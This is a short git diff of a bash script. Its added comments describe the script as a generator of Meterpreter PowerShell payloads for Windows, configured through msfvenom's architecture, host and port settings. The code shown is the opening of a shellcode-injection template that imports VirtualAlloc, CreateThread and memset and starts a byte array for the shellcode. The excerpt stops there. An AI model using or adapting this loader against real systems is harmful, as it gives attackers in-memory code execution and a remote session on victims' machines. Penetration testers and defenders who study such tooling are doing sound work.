@@ -1,5 +1,7 @@
 #!/bin/bash
-# Place this script in your PATH. Currently, the Usage shows this script to be placed local. 
+# Place this script in your PATH. Currently, the Usage shows this script to be placed local.
+# This script helps develop a meterpreter powershell script to run on Windows machines.
+# Change msfvenom parameters to change target architecture, localhost, and local port. 
 
 
 code1="\$code = ' [DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport(\"msvcrt.dll\")] public static extern IntPtr memset(IntPtr dest, uint src, uint count);'; \$winFunc = Add-Type -memberDefinition \$code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]\$sc="
